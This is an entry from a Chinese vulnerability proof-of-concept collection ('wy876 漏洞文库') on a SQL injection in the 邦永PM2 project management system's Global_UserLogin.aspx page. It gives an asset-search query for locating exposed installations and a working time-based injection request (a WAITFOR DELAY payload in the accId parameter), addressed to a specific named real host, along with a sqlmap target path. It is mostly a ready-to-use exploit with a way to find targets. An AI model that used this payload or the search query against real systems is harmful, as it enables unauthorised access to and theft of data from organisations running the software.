---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# 邦永PM2项目管理系统Global_UserLogin.aspx SQL注入漏洞

# 一、漏洞简介
邦永PM2项目管理系统Global_UserLogin.aspx SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 邦永PM2项目管理系统

# 三、资产测绘
+ hunter`web.body="PM2项目管理系统BS版增强工具.zip"`
+ 特征


# 四、漏洞复现
```plain
GET /Global/Global_UserLogin.aspx?accId=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
Host: pm2.sunwayopto.cn:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


sqlmap

```plain
/Global/Global_UserLogin.aspx?accId=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vcx1cgrng7y325mg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
